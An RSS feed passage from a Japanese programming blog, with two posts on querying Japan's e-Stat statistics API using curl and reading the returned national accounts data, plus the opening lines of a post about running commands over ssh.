&lt;/figure>&lt;/p></description></item><item><title>e-Statのデータの見方</title><link>https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/</link><pubDate>Sat, 25 Dec 2021 21:55:55 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/anal.jpg" alt="Featured image of post e-Statのデータの見方" />&lt;p>今回は前回登場したデータの内容を調べてみましょう。&lt;br>
「統計表情報取得」（リスト取得）APIで取得したデータをもとにe-Statのサイト（https://www.e-stat.go.jp/）からデータを見つけてみましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;LIST_INF id=&amp;quot;0003384123&amp;quot;&amp;gt;
&amp;lt;STAT_NAME code=&amp;quot;00100409&amp;quot;&amp;gt;国民経済計算&amp;lt;/STAT_NAME&amp;gt;
&amp;lt;GOV_ORG code=&amp;quot;00100&amp;quot;&amp;gt;内閣府&amp;lt;/GOV_ORG&amp;gt;
&amp;lt;STATISTICS_NAME&amp;gt;四半期別ＧＤＰ速報 過去の値 1次速報値&amp;lt;/STATISTICS_NAME&amp;gt;
&amp;lt;TITLE&amp;gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）&amp;lt;/TITLE&amp;gt;
&amp;lt;CYCLE&amp;gt;四半期&amp;lt;/CYCLE&amp;gt;
&amp;lt;SURVEY_DATE&amp;gt;201007-201009&amp;lt;/SURVEY_DATE&amp;gt;
&amp;lt;OPEN_DATE&amp;gt;2020-04-01&amp;lt;/OPEN_DATE&amp;gt;
&amp;lt;SMALL_AREA&amp;gt;0&amp;lt;/SMALL_AREA&amp;gt;
&amp;lt;/LIST_INF&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="データを検索してみよう">データを検索してみよう&lt;/h2>
&lt;p>IDで検索できるのが一番良いのですが、キーワード検索のテキストフィールドに入力して検索してもダメでした。&lt;/p>
&lt;p>しょうが無いので、TITLE全文「形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）」で検索しましたがでダメでした。&lt;/p>
&lt;p>少し削って、「形態別国内家計最終消費支出 年度デフレータ—　前年度比」 だと４０５件。&lt;br>
多すぎるので、SURVEY_DATE、OPEN_DATEを使って調査年、調査月、公開年月で絞り込むと２件に絞り込めました。&lt;br>
あとはSTATISTICS_NAMEで特定できました。&lt;/p>
&lt;h2 id="詳細ページに行ってみましょう">詳細ページに行ってみましょう&lt;/h2>
&lt;p>&lt;a class="link" href="https://www.e-stat.go.jp/stat-search/database?page=1&amp;amp;query=%E5%BD%A2%E6%85%8B%E5%88%A5%E5%9B%BD%E5%86%85%E5%AE%B6%E8%A8%88%E6%9C%80%E7%B5%82%E6%B6%88%E8%B2%BB%E6%94%AF%E5%87%BA%20%E5%B9%B4%E5%BA%A6%E3%83%87%E3%83%95%E3%83%AC%E3%83%BC%E3%82%BF%E2%80%94%E3%80%80%E5%89%8D%E5%B9%B4%E5%BA%A6%20%20%20%20%20%20%20&amp;amp;layout=dataset&amp;amp;year=20100&amp;amp;month=23070900&amp;amp;open_date=202004&amp;amp;statdisp_id=0003384123&amp;amp;metadata=1&amp;amp;data=1" target="_blank" rel="noopener"
>https://www.e-stat.go.jp/stat-search/database?page=1&amp;query=%E5%BD%A2%E6%85%8B%E5%88%A5%E5%9B%BD%E5%86%85%E5%AE%B6%E8%A8%88%E6%9C%80%E7%B5%82%E6%B6%88%E8%B2%BB%E6%94%AF%E5%87%BA%20%E5%B9%B4%E5%BA%A6%E3%83%87%E3%83%95%E3%83%AC%E3%83%BC%E3%82%BF%E2%80%94%E3%80%80%E5%89%8D%E5%B9%B4%E5%BA%A6%20%20%20%20%20%20%20&amp;layout=dataset&amp;year=20100&amp;month=23070900&amp;open_date=202004&amp;statdisp_id=0003384123&amp;metadata=1&amp;data=1&lt;/a>&lt;/p>
&lt;p>上段が「統計表情報取得」の内容&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 147;
flex-basis: 355px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/list.png" data-size="1986x1342">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/list.png"
width="1986"
height="1342"
loading="lazy"
alt="統計表情報"
>
&lt;/a>
&lt;/a>
&lt;figcaption>統計表情報&lt;/figcaption>
&lt;/figure>&lt;br>
下段が「メタ情報取得」の内容見たいです。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 155;
flex-basis: 373px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/meta.png" data-size="1988x1278">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/meta.png"
width="1988"
height="1278"
loading="lazy"
alt="メタ情報取得"
>
&lt;/a>
&lt;/a>
&lt;figcaption>メタ情報取得&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>DBをクリックするとグラフが表示されました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 240;
flex-basis: 576px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/tokei.png" data-size="1892x788">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/tokei.png"
width="1892"
height="788"
loading="lazy"
alt="グラフ"
>
&lt;/a>
&lt;/a>
&lt;figcaption>グラフ&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>行情報が「1981年度、1982年度、1983年度。。。」&lt;br>
列情報が「家計最終消費支出（再掲）、家計最終消費支出（再掲）_居住者家計の海外での直接購入、。。。」&lt;/p>
&lt;p>なんと、APIクリックすると丁寧にクエリを表示してくれました(API仕様書とか見る必要ないですね)。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 164;
flex-basis: 393px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/api.png" data-size="1962x1196">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/api.png"
width="1962"
height="1196"
loading="lazy"
alt="API"
>
&lt;/a>
&lt;/a>
&lt;figcaption>API&lt;/figcaption>
&lt;/figure>&lt;br>
フォーマットもXML,JSON,CSVが選べますね。&lt;br>
私はCSVの方が扱いやすいのでこれからはCSVでダウンロードすることにします。&lt;/p>
&lt;p>appIdがカラに空になっているので追加してcurlで叩くだけでいいですね。至れり尽くりです。&lt;/p>
&lt;pre tabindex="0">&lt;code>curl &amp;quot;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003384123&amp;amp;metaGetFlg=Y&amp;amp;cntGetFlg=N&amp;amp;explanationGetFlg=Y&amp;amp;annotationGetFlg=Y&amp;amp;sectionHeaderFlg=1&amp;amp;replaceSpChars=0&amp;quot;
&amp;quot;tab_code&amp;quot;,&amp;quot;表章項目&amp;quot;,&amp;quot;cat01_code&amp;quot;,&amp;quot;形態別国内家計最終消費支出&amp;quot;,&amp;quot;time_code&amp;quot;,&amp;quot;時間軸（年度）&amp;quot;,&amp;quot;unit&amp;quot;,&amp;quot;value&amp;quot;,&amp;quot;annotation&amp;quot;
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;11&amp;quot;,&amp;quot;家計最終消費支出（再掲）&amp;quot;,&amp;quot;1981100000&amp;quot;,&amp;quot;1981年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;3.8&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;11&amp;quot;,&amp;quot;家計最終消費支出（再掲）&amp;quot;,&amp;quot;1982100000&amp;quot;,&amp;quot;1982年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;2.3&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;11&amp;quot;,&amp;quot;家計最終消費支出（再掲）&amp;quot;,&amp;quot;1983100000&amp;quot;,&amp;quot;1983年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;2&amp;quot;,&amp;quot;&amp;quot;
.
.
.
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;12&amp;quot;,&amp;quot;家計最終消費支出（再掲）_居住者家計の海外での直接購入&amp;quot;,&amp;quot;1981100000&amp;quot;,&amp;quot;1981年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;17.6&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;12&amp;quot;,&amp;quot;家計最終消費支出（再掲）_居住者家計の海外での直接購入&amp;quot;,&amp;quot;1982100000&amp;quot;,&amp;quot;1982年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;15.6&amp;quot;,&amp;quot;&amp;quot;
&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;12&amp;quot;,&amp;quot;家計最終消費支出（再掲）_居住者家計の海外での直接購入&amp;quot;,&amp;quot;1983100000&amp;quot;,&amp;quot;1983年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;-1.8&amp;quot;,&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;h2 id="データの見方は">データの見方は？&lt;/h2>
&lt;p>DBで表示させた「統計表表示」と見比べてみると&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 240;
flex-basis: 576px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/tokei.png" data-size="1892x788">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/tokei.png"
width="1892"
height="788"
loading="lazy"
alt="グラフ"
>
&lt;/a>
&lt;/a>
&lt;figcaption>グラフ&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;quot;17&amp;quot;,&amp;quot;前年度比&amp;quot;,&amp;quot;11&amp;quot;,&amp;quot;家計最終消費支出（再掲）&amp;quot;,&amp;quot;1981100000&amp;quot;,&amp;quot;1981年度&amp;quot;,&amp;quot;％&amp;quot;,&amp;quot;3.8&amp;quot;,&amp;quot;&amp;quot;
&lt;/code>&lt;/pre>&lt;p>が１行目「1981年度」の１列目「家計最終消費支出（再掲）」に該当するみたいですね。&lt;br>
１セル、１行のデータ構造みたいですね。&lt;br>
１列目の情報がしばらく続いて、全行終わると次は２列目の情報みたいな構成だということがわかりました。&lt;/p>
&lt;h2 id="国民経済計算って何">国民経済計算って何&lt;/h2>
&lt;p>このデータは国民経済計算を算出したものということですが、国民経済計算ってなんでしょう？&lt;/p>
&lt;p>内閣府のサイトによると&lt;br>
国民経済計算は「四半期別ＧＤＰ速報」と「国民経済計算年次推計」の２つからなっている。「四半期別ＧＤＰ速報」は速報性を重視し、ＧＤＰをはじめとする支出側系列等を、年に８回四半期別に作成・公表している。「国民経済計算年次推計」は、生産・分配・支出・資本蓄積といったフロー面や、資産・負債といったストック面も含めて、年に１回作成・公表している。&lt;/p>
&lt;p>GDPを算出するための何かみたいですね。&lt;/p>
&lt;p>googleの検索結果を見てみると、国や地方自治体のサイトや経済学の解説サイトがメインで、たまに今年のGDPはどうだったという記事でちょっと書かれてたりしました。&lt;/p>
&lt;p>記事の中でちょっと気になったのは、&lt;br>
日本では新型コロナウイルスの影響で個人消費が落ち込んでおり、貯蓄が増加傾向にあります。内閣府の国民経済計算によると、2020年に消費されずに貯蓄に回ったお金は、一律10万円の特別定額給付金の影響もあり、35.8兆円に達しました。この額は前年の5倍の水準です。&lt;br>
所得に対する貯蓄の割合を示す家計貯蓄率は13.1%と19年度（3.7%）から大きく上昇した。&lt;/p>
&lt;p>前年度から比較して急激に大きくなったという部分(5倍も！)。こういうのは是非ピックアップしたいと思いました。&lt;/p>
&lt;h2 id="e-statでのマイニングの目的は">e-Statでのマイニングの目的は&lt;/h2>
&lt;p>とわ言え「国民経済計算」全般的に堅い感じですね。。。。&lt;/p>
&lt;p>私のe-Statマイニングの目的は大量の政府公開データに埋もれている中から人の興味を引きそうな面白そうなコンテンツをピックアップしてわかりやすくサマリーを表示することなのです。&lt;/p>
&lt;p>キーワードランキングを見てみると「アイスクリーム」「身長・体重の平均値」みたいな面白そうな柔らかめのコンテンツもあるんです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 149;
flex-basis: 358px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/ranking.png" data-size="1434x960">
&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-25-01-ani/ranking.png"
width="1434"
height="960"
loading="lazy"
alt="ランキング"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ランキング&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>次回から、&lt;br>
・e-Statの森の中から面白いコンテンツを見つけよう&lt;br>
・うまくサマライズして表示しよう&lt;br>
　　興味深い列情報に絞りたい&lt;br>
　　前年度から５倍とか急激に変化した部分をピックアップして伝えたい&lt;br>
という視点からe-Statを調査していきたいと思います。&lt;/p></description></item><item><title>知識ゼロからのe-Statマイニング</title><link>https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/</link><pubDate>Fri, 24 Dec 2021 18:12:54 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/anal.jpg" alt="Featured image of post 知識ゼロからのe-Statマイニング" />&lt;p>知識ゼロからのe-Statマイニング&lt;br>
日頃から大量のデータを使ってデータマイニングしてみたいなと思って暇なときにサイトを巡回していたらe-Statという日本の統計が閲覧できる政府統計ポータルサイトを発見しました。&lt;br>
アイスの売り上げから子供の平均身長まで大量の統計資料が公開されており、しかもAPIまであるすごいサイトです。 このe-Statをマイニングしてみようと思います。&lt;br>
まずはAPIを叩くところまでやってみます。&lt;/p>
&lt;h2 id="まずはアプリケーションidを取得しよう">まずはアプリケーションIDを取得しよう&lt;/h2>
&lt;p>APIを叩くにはアプリケーションIDが必要です。&lt;br>
まずはアプリケーションIDを取得しましょう。&lt;br>
アプリケーションIDを取得するにはユーザー登録が必要です。以下のURLから手順に従ってユーザー登録してください。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.e-stat.go.jp/mypage/user/preregister" target="_blank" rel="noopener"
>https://www.e-stat.go.jp/mypage/user/preregister&lt;/a>&lt;/p>
&lt;p>アプリケーションIDはログイン後マイページ内のAPI機能(アプリケーションID発行)で取得できます。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.e-stat.go.jp/mypage/view/api" target="_blank" rel="noopener"
>https://www.e-stat.go.jp/mypage/view/api&lt;/a>&lt;/p>
&lt;p>入力項目は名称、URL、概要の３つです。&lt;br>
名称、概要は適当で大丈夫です。&lt;br>
URLは、http://localhostだと私はダメだったのでこのサイトのURLを設定しました。&lt;/p>
&lt;p>発行ボタンを押すとappIdにアプリケーションIDが払い出されます。&lt;/p>
&lt;h2 id="apiを叩いてみよう">APIを叩いてみよう&lt;/h2>
&lt;p>APIの仕様は以下のURLに記載されています。&lt;/p>
&lt;p>&lt;a class="link" href="https://www.e-stat.go.jp/api/api-info/e-stat-manual3-0" target="_blank" rel="noopener"
>https://www.e-stat.go.jp/api/api-info/e-stat-manual3-0&lt;/a>&lt;/p>
&lt;p>難しいです。&lt;br>
なんとなく、「統計表情報取得」でリストを取得して、「メタ情報取得」「統計データ取得」で個別のデータを取得する感じでしょうか？&lt;br>
まずは叩いてみます。&lt;/p>
&lt;h2 id="統計表情報取得">統計表情報取得&lt;/h2>
&lt;pre tabindex="0">&lt;code>curl &amp;quot;http://api.e-stat.go.jp/rest/1.0/app/getStatsList?appId=xxxxxxxxx&amp;amp;lang=J&amp;amp;searchKind=&amp;amp;searchWord=&amp;quot;
&amp;lt;LIST_INF id=&amp;quot;0003384123&amp;quot;&amp;gt;
&amp;lt;STAT_NAME code=&amp;quot;00100409&amp;quot;&amp;gt;国民経済計算&amp;lt;/STAT_NAME&amp;gt;
&amp;lt;GOV_ORG code=&amp;quot;00100&amp;quot;&amp;gt;内閣府&amp;lt;/GOV_ORG&amp;gt;
&amp;lt;STATISTICS_NAME&amp;gt;四半期別ＧＤＰ速報 過去の値 1次速報値&amp;lt;/STATISTICS_NAME&amp;gt;
&amp;lt;TITLE&amp;gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）&amp;lt;/TITLE&amp;gt;
&amp;lt;CYCLE&amp;gt;四半期&amp;lt;/CYCLE&amp;gt;
&amp;lt;SURVEY_DATE&amp;gt;201007-201009&amp;lt;/SURVEY_DATE&amp;gt;
&amp;lt;OPEN_DATE&amp;gt;2020-04-01&amp;lt;/OPEN_DATE&amp;gt;
&amp;lt;SMALL_AREA&amp;gt;0&amp;lt;/SMALL_AREA&amp;gt;
&amp;lt;/LIST_INF&amp;gt;
&lt;/code>&lt;/pre>&lt;p>LIST_INF idの「0003384123」」が個別データのidみたいです。これを使ってメタ情報取得、統計情報取得を呼び出します。&lt;/p>
&lt;p>##メタ情報取得&lt;/p>
&lt;pre tabindex="0">&lt;code>curl &amp;quot;http://api.e-stat.go.jp/rest/1.0/app/getMetaInfo?appId=xxxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003384123&amp;quot;
&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;
&amp;lt;GET_META_INFO xsi:noNamespaceSchemaLocation=&amp;quot;https://api.e-stat.go.jp/rest/1.0/schema/GetMetaInfo.xsd&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&amp;gt;
&amp;lt;RESULT&amp;gt;
&amp;lt;STATUS&amp;gt;0&amp;lt;/STATUS&amp;gt;
&amp;lt;ERROR_MSG&amp;gt;正常に終了しました。&amp;lt;/ERROR_MSG&amp;gt;
&amp;lt;DATE&amp;gt;2021-12-24T18:35:07.926+09:00&amp;lt;/DATE&amp;gt;
&amp;lt;/RESULT&amp;gt;
&amp;lt;PARAMETER&amp;gt;
&amp;lt;LANG&amp;gt;J&amp;lt;/LANG&amp;gt;
&amp;lt;STATS_DATA_ID&amp;gt;0003384123&amp;lt;/STATS_DATA_ID&amp;gt;
&amp;lt;/PARAMETER&amp;gt;
&amp;lt;METADATA_INF&amp;gt;
&amp;lt;TABLE_INF id=&amp;quot;0003384123&amp;quot;&amp;gt;
&amp;lt;STAT_NAME code=&amp;quot;00100409&amp;quot;&amp;gt;国民経済計算&amp;lt;/STAT_NAME&amp;gt;
&amp;lt;GOV_ORG code=&amp;quot;00100&amp;quot;&amp;gt;内閣府&amp;lt;/GOV_ORG&amp;gt;
&amp;lt;STATISTICS_NAME&amp;gt;四半期別ＧＤＰ速報 過去の値 1次速報値&amp;lt;/STATISTICS_NAME&amp;gt;
&amp;lt;TITLE&amp;gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）&amp;lt;/TITLE&amp;gt;
&amp;lt;SURVEY_DATE&amp;gt;201007-201009&amp;lt;/SURVEY_DATE&amp;gt;
&amp;lt;/TABLE_INF&amp;gt;
&amp;lt;CLASS_INF&amp;gt;
&amp;lt;CLASS_OBJ id=&amp;quot;tab&amp;quot; name=&amp;quot;表章項目&amp;quot; description=&amp;quot;Excelの書式設定で統計表の数値を&amp;amp;quot;-0.0&amp;amp;quot;としている場合、データベース上&amp;amp;quot;0.0&amp;amp;quot;として収録されているため、Excel統計表の数値とは必ずしも一致しない。&amp;quot;&amp;gt;
&amp;lt;CLASS code=&amp;quot;17&amp;quot; name=&amp;quot;前年度比&amp;quot; level=&amp;quot;&amp;quot; unit=&amp;quot;％&amp;quot;/&amp;gt;
&amp;lt;/CLASS_OBJ&amp;gt;
&amp;lt;CLASS_OBJ id=&amp;quot;cat01&amp;quot; name=&amp;quot;形態別国内家計最終消費支出&amp;quot;&amp;gt;
&amp;lt;CLASS code=&amp;quot;11&amp;quot; name=&amp;quot;家計最終消費支出（再掲）&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;12&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_居住者家計の海外での直接購入&amp;quot; level=&amp;quot;2&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;13&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_（控除）非居住者家計の国内での直接購入&amp;quot; level=&amp;quot;2&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;14&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_国内家計最終消費支出&amp;quot; level=&amp;quot;2&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;15&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_国内家計最終消費支出_耐久財&amp;quot; level=&amp;quot;3&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;16&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_国内家計最終消費支出_半耐久財&amp;quot; level=&amp;quot;3&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;17&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_国内家計最終消費支出_非耐久財&amp;quot; level=&amp;quot;3&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;18&amp;quot; name=&amp;quot;家計最終消費支出（再掲）_国内家計最終消費支出_サービス&amp;quot; level=&amp;quot;3&amp;quot;/&amp;gt;
&amp;lt;/CLASS_OBJ&amp;gt;
&amp;lt;CLASS_OBJ id=&amp;quot;time&amp;quot; name=&amp;quot;時間軸（年度）&amp;quot;&amp;gt;
&amp;lt;CLASS code=&amp;quot;1981100000&amp;quot; name=&amp;quot;1981年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1982100000&amp;quot; name=&amp;quot;1982年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1983100000&amp;quot; name=&amp;quot;1983年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1984100000&amp;quot; name=&amp;quot;1984年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1985100000&amp;quot; name=&amp;quot;1985年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1986100000&amp;quot; name=&amp;quot;1986年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1987100000&amp;quot; name=&amp;quot;1987年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1988100000&amp;quot; name=&amp;quot;1988年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&amp;lt;CLASS code=&amp;quot;1989100000&amp;quot; name=&amp;quot;1989年度&amp;quot; level=&amp;quot;1&amp;quot;/&amp;gt;
&lt;/code>&lt;/pre>&lt;p>上の方がデータ内容の説明なのか？よくわかりません。&lt;/p>
&lt;h2 id="統計情報取得">統計情報取得&lt;/h2>
&lt;pre tabindex="0">&lt;code>curl &amp;quot;http://api.e-stat.go.jp/rest/1.0/app/getStatsData?limit=10000&amp;amp;appId=xxxxxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003384123&amp;amp;metaGetFlg=N&amp;amp;cntGetFlg=N&amp;quot;
&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; standalone=&amp;quot;yes&amp;quot;?&amp;gt;
&amp;lt;GET_STATS_DATA xsi:noNamespaceSchemaLocation=&amp;quot;https://api.e-stat.go.jp/rest/1.0/schema/GetStatsData.xsd&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&amp;gt;
&amp;lt;RESULT&amp;gt;
&amp;lt;STATUS&amp;gt;0&amp;lt;/STATUS&amp;gt;
&amp;lt;ERROR_MSG&amp;gt;正常に終了しました。&amp;lt;/ERROR_MSG&amp;gt;
&amp;lt;DATE&amp;gt;2021-12-24T18:37:22.156+09:00&amp;lt;/DATE&amp;gt;
&amp;lt;/RESULT&amp;gt;
&amp;lt;PARAMETER&amp;gt;
&amp;lt;LANG&amp;gt;J&amp;lt;/LANG&amp;gt;
&amp;lt;STATS_DATA_ID&amp;gt;0003384123&amp;lt;/STATS_DATA_ID&amp;gt;
&amp;lt;DATA_FORMAT&amp;gt;X&amp;lt;/DATA_FORMAT&amp;gt;
&amp;lt;START_POSITION&amp;gt;1&amp;lt;/START_POSITION&amp;gt;
&amp;lt;LIMIT&amp;gt;10000&amp;lt;/LIMIT&amp;gt;
&amp;lt;METAGET_FLG&amp;gt;N&amp;lt;/METAGET_FLG&amp;gt;
&amp;lt;CNT_GET_FLG&amp;gt;N&amp;lt;/CNT_GET_FLG&amp;gt;
&amp;lt;/PARAMETER&amp;gt;
&amp;lt;STATISTICAL_DATA&amp;gt;
&amp;lt;TABLE_INF id=&amp;quot;0003384123&amp;quot;&amp;gt;
&amp;lt;STAT_NAME code=&amp;quot;00100409&amp;quot;&amp;gt;国民経済計算&amp;lt;/STAT_NAME&amp;gt;
&amp;lt;GOV_ORG code=&amp;quot;00100&amp;quot;&amp;gt;内閣府&amp;lt;/GOV_ORG&amp;gt;
&amp;lt;STATISTICS_NAME&amp;gt;四半期別ＧＤＰ速報 過去の値 1次速報値&amp;lt;/STATISTICS_NAME&amp;gt;
&amp;lt;TITLE&amp;gt;形態別国内家計最終消費支出 年度デフレータ—　前年度比（1981年～）（2000暦年＝100）&amp;lt;/TITLE&amp;gt;
&amp;lt;SURVEY_DATE&amp;gt;201007-201009&amp;lt;/SURVEY_DATE&amp;gt;
&amp;lt;TOTAL_NUMBER&amp;gt;232&amp;lt;/TOTAL_NUMBER&amp;gt;
&amp;lt;FROM_NUMBER&amp;gt;1&amp;lt;/FROM_NUMBER&amp;gt;
&amp;lt;TO_NUMBER&amp;gt;232&amp;lt;/TO_NUMBER&amp;gt;
&amp;lt;/TABLE_INF&amp;gt;
&amp;lt;DATA_INF&amp;gt;
&amp;lt;NOTE char=&amp;quot;***&amp;quot;&amp;gt;数字が得られないもの&amp;lt;/NOTE&amp;gt;
&amp;lt;NOTE char=&amp;quot;-&amp;quot;&amp;gt;数字が得られないもの&amp;lt;/NOTE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1981100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;3.8&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1982100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;2.3&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1983100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;2&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1984100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;2.2&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1985100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;1.2&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1986100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;0.1&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1987100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;0.5&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1988100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;0.5&amp;lt;/VALUE&amp;gt;
&amp;lt;VALUE tab=&amp;quot;17&amp;quot; cat01=&amp;quot;11&amp;quot; time=&amp;quot;1989100000&amp;quot; unit=&amp;quot;％&amp;quot;&amp;gt;2.5&amp;lt;/VALUE&amp;gt;
&lt;/code>&lt;/pre>&lt;p>VALUEが値みたいですがどういう列情報になっているのでしょうか？&lt;br>
とりあえずAPIはお手軽に叩けることがわかりました。&lt;br>
次回以降はデータの内容を理解していこうと思います。&lt;/p></description></item><item><title>【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法</title><link>https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/</link><pubDate>Fri, 24 Dec 2021 11:55:21 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash.jpg" alt="Featured image of post 【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法" />&lt;h2 id="やりたいこと">やりたいこと&lt;/h2>
&lt;p>sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。&lt;/p>
